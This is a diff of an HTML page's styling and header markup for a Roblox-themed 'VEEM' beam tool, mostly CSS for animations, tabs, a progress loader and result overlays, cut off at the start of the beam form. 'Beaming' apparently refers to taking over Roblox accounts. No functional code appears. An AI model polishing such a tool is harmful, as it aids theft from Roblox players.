@@ -1,21 +1,25 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <link rel="shortcut icon" href="robux.png" type="image/x-icon">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VEEM 1.2 - Beem Tool</title>
+  <title>VEEM Ultimate - Advanced Beam Tool</title>
   <style>
     :root {
       --primary-color: #E62C2C;
       --secondary-color: #D12828;
-      --accent-color: #F04747;
-      --bg-dark-1: #1B1B1B;
-      --bg-dark-2: #2A2A2A;
+      --accent-color: #FF4444;
+      --success-color: #00FF88;
+      --warning-color: #FFB347;
+      --error-color: #FF4444;
+      --bg-dark-1: #0F0F0F;
+      --bg-dark-2: #1B1B1B;
+      --bg-dark-3: #2A2A2A;
       --text-white: #FFFFFF;
       --text-gray: #B0B0B0;
-      --blur-intensity: 8px;
+      --blur-intensity: 12px;
       --animation-speed: 0.6s;
+      --particle-count: 35;
     }
 
     * {
@@ -25,8 +29,8 @@
     }
 
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, var(--bg-dark-1) 0%, var(--bg-dark-2) 100%);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, var(--bg-dark-1) 0%, var(--bg-dark-2) 50%, var(--bg-dark-3) 100%);
       color: var(--text-white);
       min-height: 100vh;
       display: flex;
@@ -36,7 +40,34 @@
       position: relative;
     }
 
-    #particles {
+    /* Animated Background */
+    #background-effects {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      overflow: hidden;
+      pointer-events: none;
+    }
+
+    .bg-gradient {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 20% 30%, rgba(230, 44, 44, 0.15) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 70%, rgba(255, 68, 68, 0.1) 0%, transparent 50%);
+      animation: bgPulse 8s ease-in-out infinite;
+    }
+
+    @keyframes bgPulse {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 0.8; }
+    }
+
+    /* Particles Container */
+    #particles-container {
       position: fixed;
       top: 0;
       left: 0;
@@ -50,191 +81,248 @@
       position: absolute;
       background: rgba(230, 44, 44, 0.1);
       border: 1px solid rgba(230, 44, 44, 0.3);
-      animation: float var(--animation-speed) ease-in-out infinite;
-    }
-
-    .particle.cube {
-      transform-style: preserve-3d;
+      animation: floatParticle var(--animation-speed) ease-in-out infinite;
     }
 
     .particle.sphere {
       border-radius: 50%;
     }
 
-    @keyframes float {
+    .particle.cube {
+      border-radius: 4px;
+    }
+
+    @keyframes floatParticle {
       0%, 100% {
         transform: translateY(0) rotate(0deg);
+        opacity: 0.3;
       }
       50% {
-        transform: translateY(-20px) rotate(180deg);
+        transform: translateY(-30px) rotate(180deg);
+        opacity: 0.6;
       }
     }
 
+    /* Main Container */
     .container {
       position: relative;
       z-index: 10;
       width: 90%;
-      max-width: 600px;
+      max-width: 700px;
       margin: 20px;
     }
 
     .glass-card {
-      background: rgba(26, 26, 26, 0.7);
+      background: rgba(26, 26, 26, 0.8);
       backdrop-filter: blur(var(--blur-intensity));
-      border-radius: 20px;
+      border-radius: 24px;
       border: 1px solid rgba(230, 44, 44, 0.3);
-      box-shadow: 0 8px 32px rgba(230, 44, 44, 0.2), 0 0 40px rgba(230, 44, 44, 0.1);
-      padding: 40px;
-      animation: cardEntrance 0.8s ease-out;
+      box-shadow: 0 12px 48px rgba(230, 44, 44, 0.25), 
+                  0 0 60px rgba(230, 44, 44, 0.15),
+                  inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      padding: 45px;
+      animation: cardEntrance 1s ease-out;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+      animation: scanLine 3s linear infinite;
+    }
+
+    @keyframes scanLine {
+      0% { left: -100%; }
+      100% { left: 100%; }
     }
 
     @keyframes cardEntrance {
       from {
         opacity: 0;
-        transform: translateY(30px);
+        transform: translateY(40px) scale(0.95);
       }
       to {
         opacity: 1;
-        transform: translateY(0);
+        transform: translateY(0) scale(1);
       }
     }
 
-    .header {
+    /* Header */
+    .app-header {
       text-align: center;
-      margin-bottom: 30px;
+      margin-bottom: 35px;
       position: relative;
     }
 
-    .lang-toggle {
-      position: absolute;
-      top: 0;
-      right: 0;
-      padding: 10px 20px;
-      background: rgba(40, 40, 40, 0.6);
-      border: 2px solid rgba(230, 44, 44, 0.3);
-      border-radius: 8px;
-      color: var(--text-white);
-      font-size: 0.9em;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      backdrop-filter: blur(5px);
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      flex-wrap: wrap;
     }
 
-    .lang-toggle:hover {
-      background: rgba(40, 40, 40, 0.8);
-      border-color: var(--primary-color);
-      transform: scale(1.05);
-    }
-
-    .header h1 {
-      font-size: 2.5em;
-      margin-bottom: 10px;
-      background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+    .app-title {
+      font-size: 3em;
+      font-weight: 800;
+      background: linear-gradient(135deg, var(--primary-color), var(--accent-color), var(--primary-color));
+      background-size: 200% 200%;
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
       display: inline-block;
-      animation: glow 2s ease-in-out infinite;
+      animation: titleGlow 3s ease-in-out infinite, gradientShift 4s ease infinite;
+      letter-spacing: 2px;
+      text-shadow: 0 0 30px rgba(230, 44, 44, 0.5);
     }
 
-    @keyframes glow {
+    @keyframes titleGlow {
       0%, 100% {
-        filter: drop-shadow(0 0 10px rgba(230, 44, 44, 0.5));
+        filter: drop-shadow(0 0 15px rgba(230, 44, 44, 0.6));
       }
       50% {
-        filter: drop-shadow(0 0 20px rgba(230, 44, 44, 0.8));
+        filter: drop-shadow(0 0 30px rgba(230, 44, 44, 0.9));
       }
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .version-badge {
+      display: inline-block;
+      padding: 6px 16px;
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      border-radius: 20px;
+      font-size: 0.9em;
+      font-weight: 600;
+      box-shadow: 0 4px 15px rgba(230, 44, 44, 0.4);
+      animation: badgePulse 2s ease-in-out infinite;
+    }
+
+    @keyframes badgePulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
     }
 
     .icon-roblox {
       display: inline-block;
-      width: 40px;
-      height: 40px;
-      margin-left: 10px;
+      width: 50px;
+      height: 50px;
       background: var(--primary-color);
-      border-radius: 8px;
+      border-radius: 10px;
       position: relative;
-      animation: rotate 4s linear infinite;
-      vertical-align: middle;
+      animation: iconRotate 6s linear infinite;
+      box-shadow: 0 0 25px rgba(230, 44, 44, 0.6);
     }
 
     .icon-roblox::before {
       content: '';
       position: absolute;
-      width: 20px;
-      height: 20px;
+      width: 25px;
+      height: 25px;
       background: white;
-      border-radius: 4px;
+      border-radius: 5px;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%) rotate(45deg);
     }
 
-    @keyframes rotate {
-      from {
-        transform: rotate(0deg);
-      }
-      to {
-        transform: rotate(360deg);
-      }
+    @keyframes iconRotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
     }
 
-    .tabs {
+    /* Tab Navigation */
+    .tab-navigation {
       display: flex;
-      gap: 10px;
-      margin-bottom: 30px;
-      border-bottom: 2px solid rgba(230, 44, 44, 0.3);
+      gap: 12px;
+      margin-bottom: 35px;
+      border-bottom: 2px solid rgba(230, 44, 44, 0.2);
+      position: relative;
     }
 
-    .tab {
+    .tab-btn {
       flex: 1;
-      padding: 15px 20px;
+      padding: 16px 24px;
       background: transparent;
       border: none;
       color: var(--text-gray);
       cursor: pointer;
-      font-size: 1em;
+      font-size: 1.05em;
       font-weight: 600;
       transition: all 0.3s ease;
       position: relative;
-      border-radius: 8px 8px 0 0;
+      border-radius: 12px 12px 0 0;
+      overflow: hidden;
     }
 
-    .tab:hover {
-      color: var(--text-white);
+    .tab-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
       background: rgba(230, 44, 44, 0.1);
+      transform: translateY(100%);
+      transition: transform 0.3s ease;
     }
 
-    .tab.active {
+    .tab-btn:hover::before {
+      transform: translateY(0);
+    }
+
+    .tab-btn:hover {
+      color: var(--text-white);
+      transform: translateY(-2px);
+    }
+
+    .tab-btn.active {
       color: var(--primary-color);
       background: rgba(230, 44, 44, 0.15);
+      box-shadow: inset 0 -2px 0 var(--primary-color);
     }
 
-    .tab.active::after {
+    .tab-btn.active::after {
       content: '';
       position: absolute;
       bottom: -2px;
       left: 0;
       right: 0;
-      height: 2px;
-      background: var(--primary-color);
-      box-shadow: 0 0 10px var(--primary-color);
+      height: 3px;
+      background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+      box-shadow: 0 0 15px var(--primary-color);
+      animation: tabGlow 2s ease-in-out infinite;
     }
 
+    @keyframes tabGlow {
+      0%, 100% { opacity: 0.6; }
+      50% { opacity: 1; }
+    }
+
+    /* Tab Content */
     .tab-content {
       display: none;
-      animation: slideIn var(--animation-speed) ease-out;
+      animation: tabSlideIn 0.4s ease-out;
     }
 
     .tab-content.active {
       display: block;
     }
 
-    @keyframes slideIn {
+    @keyframes tabSlideIn {
       from {
         opacity: 0;
-        transform: translateX(-20px);
+        transform: translateX(-30px);
       }
       to {
         opacity: 1;
@@ -242,50 +330,96 @@
       }
     }
 
+    /* Form Groups */
     .form-group {
-      margin-bottom: 25px;
+      margin-bottom: 28px;
       position: relative;
+      animation: formFieldSlide 0.6s ease-out backwards;
     }
 
-    .form-group label {
+    .form-group:nth-child(1) { animation-delay: 0.1s; }
+    .form-group:nth-child(2) { animation-delay: 0.2s; }
+    .form-group:nth-child(3) { animation-delay: 0.3s; }
+
+    @keyframes formFieldSlide {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-label {
       display: flex;
       align-items: center;
-      gap: 8px;
-      font-size: 0.9em;
-      margin-bottom: 8px;
+      gap: 10px;
+      font-size: 0.95em;
+      margin-bottom: 10px;
       color: var(--text-gray);
-      font-weight: 500;
+      font-weight: 600;
+      transition: color 0.3s ease;
+    }
+
+    .field-icon {
+      font-size: 1.2em;
+      animation: iconBounce 2s ease-in-out infinite;
+    }
+
+    @keyframes iconBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-3px); }
     }
 
     .tooltip {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 18px;
-      height: 18px;
+      width: 20px;
+      height: 20px;
       border-radius: 50%;
       background: rgba(230, 44, 44, 0.2);
       border: 1px solid var(--primary-color);
       font-size: 0.8em;
       cursor: help;
       position: relative;
+      transition: all 0.3s ease;
+    }
+
+    .tooltip:hover {
+      background: var(--primary-color);
+      transform: scale(1.1);
     }
 
     .tooltip:hover::after {
       content: attr(data-tip);
       position: absolute;
-      bottom: calc(100% + 8px);
+      bottom: calc(100% + 12px);
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(20, 20, 20, 0.95);
+      background: rgba(10, 10, 10, 0.98);
       color: white;
-      padding: 8px 12px;
-      border-radius: 6px;
-      font-size: 0.85em;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 0.9em;
       white-space: nowrap;
-      z-index: 100;
+      z-index: 1000;
       border: 1px solid var(--primary-color);
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6), 0 0 20px rgba(230, 44, 44, 0.4);
+      animation: tooltipFadeIn 0.3s ease;
+    }
+
+    @keyframes tooltipFadeIn {
+      from {
+        opacity: 0;
+        transform: translateX(-50%) translateY(5px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+      }
     }
 
     .input-wrapper {
@@ -295,77 +429,112 @@
     .form-group input,
     .form-group textarea {
       width: 100%;
-      padding: 15px 15px 15px 45px;
-      background: rgba(40, 40, 40, 0.6);
+      padding: 16px 18px 16px 50px;
+      background: rgba(40, 40, 40, 0.7);
       border: 2px solid rgba(230, 44, 44, 0.3);
-      border-radius: 10px;
+      border-radius: 12px;
       color: var(--text-white);
       font-size: 1em;
       font-family: inherit;
       transition: all 0.3s ease;
+      outline: none;
     }
 
     .form-group textarea {
-      min-height: 120px;
+      min-height: 140px;
       resize: vertical;
       font-family: 'Courier New', monospace;
-      font-size: 0.9em;
+      font-size: 0.92em;
+      line-height: 1.5;
     }
 
     .form-group input:focus,
     .form-group textarea:focus {
-      outline: none;
       border-color: var(--primary-color);
-      box-shadow: 0 0 20px rgba(230, 44, 44, 0.4);
-      background: rgba(40, 40, 40, 0.8);
+      box-shadow: 0 0 0 4px rgba(230, 44, 44, 0.2), 0 0 30px rgba(230, 44, 44, 0.4);
+      background: rgba(40, 40, 40, 0.9);
+      transform: translateY(-2px);
     }
 
     .input-icon {
       position: absolute;
-      left: 15px;
+      left: 18px;
       top: 50%;
       transform: translateY(-50%);
-      font-size: 1.2em;
+      font-size: 1.3em;
       pointer-events: none;
+      transition: all 0.3s ease;
     }
 
     .form-group textarea + .input-icon {
-      top: 20px;
+      top: 24px;
       transform: none;
     }
 
+    .form-group:focus-within .input-icon {
+      color: var(--primary-color);
+      animation: iconPulse 0.6s ease;
+    }
+
+    @keyframes iconPulse {
+      0%, 100% { transform: translateY(-50%) scale(1); }
+      50% { transform: translateY(-50%) scale(1.2); }
+    }
+
+    /* Buttons */
     .buttons {
       display: flex;
-      gap: 15px;
-      margin-top: 30px;
+      gap: 18px;
+      margin-top: 35px;
+      animation: formFieldSlide 0.6s ease-out 0.4s backwards;
     }
 
     .btn {
       flex: 1;
-      padding: 15px 30px;
+      padding: 18px 32px;
       border: none;
-      border-radius: 10px;
-      font-size: 1em;
-      font-weight: 600;
+      border-radius: 12px;
+      font-size: 1.05em;
+      font-weight: 700;
       cursor: pointer;
       transition: all 0.3s ease;
       position: relative;
       overflow: hidden;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .btn::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.2);
+      transform: translate(-50%, -50%);
+      transition: width 0.6s, height 0.6s;
+    }
+
+    .btn:active::before {
+      width: 300px;
+      height: 300px;
     }
 
     .btn-primary {
       background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
       color: white;
-      box-shadow: 0 4px 15px rgba(230, 44, 44, 0.4);
+      box-shadow: 0 6px 24px rgba(230, 44, 44, 0.5);
     }
 
     .btn-primary:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 25px rgba(230, 44, 44, 0.6);
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 12px 36px rgba(230, 44, 44, 0.7);
     }
 
     .btn-primary:active {
-      transform: scale(0.98);
+      transform: translateY(0) scale(0.98);
     }
 
     .btn-primary:disabled {
@@ -376,91 +545,98 @@
 
     .btn-primary:disabled:hover {
       transform: none;
-      box-shadow: 0 4px 15px rgba(230, 44, 44, 0.4);
+      box-shadow: 0 6px 24px rgba(230, 44, 44, 0.5);
     }
 
     .btn-secondary {
       background: transparent;
       color: var(--text-white);
       border: 2px solid rgba(230, 44, 44, 0.5);
+      box-shadow: 0 4px 15px rgba(230, 44, 44, 0.2);
     }
 
     .btn-secondary:hover {
-      background: rgba(230, 44, 44, 0.1);
+      background: rgba(230, 44, 44, 0.15);
       border-color: var(--primary-color);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 24px rgba(230, 44, 44, 0.4);
     }
 
+    /* About Content */
     .about-content h2 {
       color: var(--primary-color);
-      margin-bottom: 15px;
-      font-size: 1.8em;
+      margin-bottom: 20px;
+      font-size: 2em;
+      text-shadow: 0 0 20px rgba(230, 44, 44, 0.5);
     }
 
     .about-content p {
       color: var(--text-gray);
-      line-height: 1.6;
-      margin-bottom: 20px;
+      line-height: 1.8;
+      margin-bottom: 25px;
+      font-size: 1.05em;
     }
 
-    .how-to-use {
-      background: rgba(40, 40, 40, 0.5);
-      padding: 20px;
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin: 25px 0;
+    }
+
+    .feature-item {
+      background: rgba(230, 44, 44, 0.1);
+      padding: 15px;
       border-radius: 10px;
       border: 1px solid rgba(230, 44, 44, 0.3);
-      margin: 20px 0;
+      transition: all 0.3s ease;
     }
 
-    .how-to-use h3 {
-      color: var(--primary-color);
-      margin-bottom: 15px;
-      font-size: 1.3em;
+    .feature-item:hover {
+      background: rgba(230, 44, 44, 0.2);
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(230, 44, 44, 0.3);
     }
 
-    .how-to-use ol {
-      margin-left: 25px;
-      color: var(--text-gray);
-      line-height: 2;
+    .stats-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 15px;
+      margin: 25px 0;
     }
 
-    .how-to-use li {
-      margin-bottom: 8px;
-    }
-
-    .contact {
+    .stat-box {
+      background: rgba(40, 40, 40, 0.6);
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid rgba(230, 44, 44, 0.3);
       text-align: center;
-      padding: 15px;
-      background: rgba(230, 44, 44, 0.1);
-      border-radius: 8px;
-      margin: 20px 0;
-      color: var(--primary-color);
-      font-weight: 600;
     }
 
-    .footer-info {
-      text-align: center;
+    .stat-number {
+      font-size: 2em;
+      font-weight: 800;
+      color: var(--primary-color);
+      text-shadow: 0 0 15px rgba(230, 44, 44, 0.6);
+    }
+
+    .stat-label {
       color: var(--text-gray);
       font-size: 0.9em;
-      margin-top: 20px;
+      margin-top: 8px;
     }
 
+    /* Settings */
     .settings-group {
-      margin-bottom: 25px;
+      margin-bottom: 28px;
     }
 
     .settings-group label {
       display: block;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       color: var(--text-gray);
-      font-weight: 500;
-    }
-
-    .settings-group input[type="color"] {
-      width: 100%;
-      height: 50px;
-      border: 2px solid rgba(230, 44, 44, 0.3);
-      border-radius: 10px;
-      cursor: pointer;
-      background: rgba(40, 40, 40, 0.6);
+      font-weight: 600;
+      font-size: 0.95em;
     }
 
     .settings-group input[type="range"] {
@@ -470,133 +646,113 @@
       background: rgba(230, 44, 44, 0.3);
       outline: none;
       -webkit-appearance: none;
+      cursor: pointer;
     }
 
     .settings-group input[type="range"]::-webkit-slider-thumb {
       -webkit-appearance: none;
-      appearance: none;
-      width: 20px;
-      height: 20px;
+      width: 24px;
+      height: 24px;
       border-radius: 50%;
       background: var(--primary-color);
       cursor: pointer;
-      box-shadow: 0 0 10px var(--primary-color);
+      box-shadow: 0 0 15px var(--primary-color), 0 0 30px rgba(230, 44, 44, 0.5);
+      transition: all 0.3s ease;
+    }
+
+    .settings-group input[type="range"]::-webkit-slider-thumb:hover {
+      transform: scale(1.2);
     }
 
     .settings-group input[type="range"]::-moz-range-thumb {
-      width: 20px;
-      height: 20px;
+      width: 24px;
+      height: 24px;
       border-radius: 50%;
       background: var(--primary-color);
       cursor: pointer;
       border: none;
-      box-shadow: 0 0 10px var(--primary-color);
-    }
-
-    .toggle-wrapper {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-
-    .toggle {
-      position: relative;
-      width: 60px;
-      height: 30px;
-      background: rgba(100, 100, 100, 0.5);
-      border-radius: 15px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-
-    .toggle.active {
-      background: var(--primary-color);
-    }
-
-    .toggle::after {
-      content: '';
-      position: absolute;
-      width: 24px;
-      height: 24px;
-      background: white;
-      border-radius: 50%;
-      top: 3px;
-      left: 3px;
-      transition: all 0.3s ease;
-    }
-
-    .toggle.active::after {
-      left: 33px;
+      box-shadow: 0 0 15px var(--primary-color);
     }
 
     .slider-value {
       display: inline-block;
-      margin-left: 10px;
+      margin-left: 12px;
       color: var(--primary-color);
-      font-weight: 600;
+      font-weight: 700;
+      font-size: 1.1em;
     }
 
-    .toast {
-      position: fixed;
-      top: -100px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(20, 20, 20, 0.95);
-      color: white;
-      padding: 15px 25px;
-      border-radius: 10px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-      z-index: 1000;
-      transition: top 0.3s ease;
-      border: 2px solid;
-      min-width: 300px;
+    .theme-selector {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    .theme-option {
+      padding: 12px;
+      border-radius: 8px;
+      border: 2px solid rgba(230, 44, 44, 0.3);
+      background: rgba(40, 40, 40, 0.6);
+      cursor: pointer;
       text-align: center;
-      font-weight: 600;
+      transition: all 0.3s ease;
     }
 
-    .toast.show {
-      top: 30px;
+    .theme-option:hover {
+      border-color: var(--primary-color);
+      transform: scale(1.05);
     }
 
-    .toast.success {
-      border-color: #4caf50;
-      background: rgba(20, 80, 20, 0.95);
+    .theme-option.active {
+      background: rgba(230, 44, 44, 0.2);
+      border-color: var(--primary-color);
+      box-shadow: 0 0 20px rgba(230, 44, 44, 0.4);
     }
 
-    .toast.error {
-      border-color: #f44336;
-      background: rgba(80, 20, 20, 0.95);
-    }
-
+    /* Advanced Loading Overlay */
     .loading-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
       display: none;
       align-items: center;
       justify-content: center;
-      z-index: 999;
+      z-index: 9999;
+      animation: overlayFadeIn 0.3s ease;
     }
 
     .loading-overlay.show {
       display: flex;
     }
 
-    .spinner {
+    @keyframes overlayFadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .loader-content {
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+    }
+
+    .loader-icon {
       width: 80px;
       height: 80px;
       background: var(--primary-color);
       border-radius: 12px;
-      animation: spin 1s linear infinite;
+      margin: 0 auto 30px;
       position: relative;
-      box-shadow: 0 0 30px var(--primary-color);
+      animation: loaderSpin 2s linear infinite;
+      box-shadow: 0 0 40px var(--primary-color);
     }
 
-    .spinner::before {
+    .loader-icon::before {
       content: '';
       position: absolute;
       width: 40px;
@@ -608,100 +764,307 @@
       transform: translate(-50%, -50%) rotate(45deg);
     }
 
-    @keyframes spin {
+    @keyframes loaderSpin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .progress-container {
+      margin-top: 20px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--primary-color), var(--accent-color), var(--primary-color));
+      background-size: 200% 100%;
+      border-radius: 20px;
+      transition: width 0.3s ease;
+      box-shadow: 0 0 20px var(--primary-color);
+      animation: progressShine 2s linear infinite;
+    }
+
+    @keyframes progressShine {
+      0% { background-position: 0% 0%; }
+      100% { background-position: 200% 0%; }
+    }
+
+    .progress-text {
+      margin-top: 20px;
+      font-size: 1.1em;
+      color: var(--text-white);
+      font-weight: 600;
+    }
+
+    .progress-percentage {
+      margin-top: 10px;
+      font-size: 1.5em;
+      color: var(--primary-color);
+      font-weight: 800;
+    }
+
+    /* Result Overlay */
+    .result-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      backdrop-filter: blur(10px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      animation: overlayFadeIn 0.3s ease;
+    }
+
+    .result-overlay.show {
+      display: flex;
+    }
+
+    .result-content {
+      text-align: center;
+      position: relative;
+    }
+
+    .result-icon {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 30px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      animation: resultIconPop 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+
+    @keyframes resultIconPop {
+      0% {
+        transform: scale(0) rotate(-180deg);
+        opacity: 0;
+      }
+      100% {
+        transform: scale(1) rotate(0deg);
+        opacity: 1;
+      }
+    }
+
+    .result-icon.success {
+      background: rgba(0, 255, 136, 0.2);
+      border: 4px solid var(--success-color);
+      box-shadow: 0 0 60px rgba(0, 255, 136, 0.6);
+    }
+
+    .result-icon.error {
+      background: rgba(255, 68, 68, 0.2);
+      border: 4px solid var(--error-color);
+      box-shadow: 0 0 60px rgba(255, 68, 68, 0.6);
+      animation: resultIconPop 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55), shakeError 0.5s ease 0.5s;
+    }
+
+    @keyframes shakeError {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-15px); }
+      75% { transform: translateX(15px); }
+    }
+
+    .result-message {
+      font-size: 1.8em;
+      font-weight: 700;
+      margin-top: 20px;
+      animation: messageFadeIn 0.6s ease 0.3s backwards;
+    }
+
+    @keyframes messageFadeIn {
       from {
-        transform: rotate(0deg);
+        opacity: 0;
+        transform: translateY(20px);
       }
       to {
-        transform: rotate(360deg);
+        opacity: 1;
+        transform: translateY(0);
       }
     }
 
-    @keyframes shake {
-      0%, 100% {
-        transform: translateX(0);
+    .result-message.success {
+      color: var(--success-color);
+      text-shadow: 0 0 30px rgba(0, 255, 136, 0.6);
+    }
+
+    .result-message.error {
+      color: var(--error-color);
+      text-shadow: 0 0 30px rgba(255, 68, 68, 0.6);
+    }
+
+    /* Confetti */
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background: var(--primary-color);
+      animation: confettiFall 3s ease-out forwards;
+    }
+
+    @keyframes confettiFall {
+      0% {
+        transform: translateY(0) rotate(0deg);
+        opacity: 1;
       }
-      25% {
-        transform: translateX(-10px);
-      }
-      75% {
-        transform: translateX(10px);
+      100% {
+        transform: translateY(100vh) rotate(720deg);
+        opacity: 0;
       }
     }
 
-    .shake {
-      animation: shake 0.3s ease;
+    /* Toast Notification */
+    .toast {
+      position: fixed;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(10, 10, 10, 0.98);
+      color: white;
+      padding: 18px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+      z-index: 10001;
+      transition: top 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      border: 2px solid;
+      min-width: 320px;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.05em;
     }
 
+    .toast.show {
+      top: 30px;
+    }
+
+    .toast.success {
+      border-color: var(--success-color);
+      background: rgba(0, 80, 40, 0.98);
+      box-shadow: 0 8px 32px rgba(0, 255, 136, 0.4);
+    }
+
+    .toast.error {
+      border-color: var(--error-color);
+      background: rgba(80, 20, 20, 0.98);
+      box-shadow: 0 8px 32px rgba(255, 68, 68, 0.4);
+    }
+
+    /* Responsive */
     @media (max-width: 768px) {
       .glass-card {
-        padding: 25px;
+        padding: 30px 20px;
       }
 
-      .header h1 {
-        font-size: 2em;
+      .app-title {
+        font-size: 2.2em;
       }
 
       .buttons {
         flex-direction: column;
       }
 
-      .tabs {
+      .tab-navigation {
         flex-direction: column;
         gap: 0;
       }
 
-      .tab {
+      .tab-btn {
         border-radius: 0;
       }
+
+      .features-grid,
+      .stats-container {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    /* Shake Animation */
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-15px); }
+      75% { transform: translateX(15px); }
+    }
+
+    .shake {
+      animation: shake 0.4s ease;
     }
   </style>
 </head>
 <body>
-  <div id="particles"></div>
+  <!-- Background Effects -->
+  <div id="background-effects">
+    <div class="bg-gradient"></div>
+  </div>
 
+  <!-- Particles Container -->
+  <div id="particles-container"></div>
+
+  <!-- Main Container -->
   <div class="container">
     <div class="glass-card">
-      <div class="header">
-        <h1 data-i18n="title">VEEM 1.2 <span class="icon-roblox"></span></h1>
-        <button class="lang-toggle" id="langToggle">🌐 ES</button>
-      </div>
+      <!-- Header -->
+      <header class="app-header">
+        <div class="logo-container">
+          <h1 class="app-title">VEEM ULTIMATE</h1>
+          <span class="version-badge">v1.0</span>
+          <div class="icon-roblox"></div>
+        </div>
+      </header>
 
-      <div class="tabs">
-        <button class="tab active" data-tab="beem" data-i18n="tab_beem">Beem</button>
-        <button class="tab" data-tab="about" data-i18n="tab_about">Acerca de</button>
-        <button class="tab" data-tab="settings" data-i18n="tab_settings">Ajustes</button>
-      </div>
+      <!-- Tab Navigation -->
+      <nav class="tab-navigation">
+        <button class="tab-btn active" data-tab="beam">Beam</button>
+        <button class="tab-btn" data-tab="about">About</button>
+        <button class="tab-btn" data-tab="settings">Settings</button>
+      </nav>
 
-      <!-- Beem Tab -->
-      <div class="tab-content active" id="beem">
-        <form id="beemForm">
+      <!-- Beam Tab -->
+      <div class="tab-content active" id="beam-tab">
+        <form id="beamForm">
           <div class="form-group">
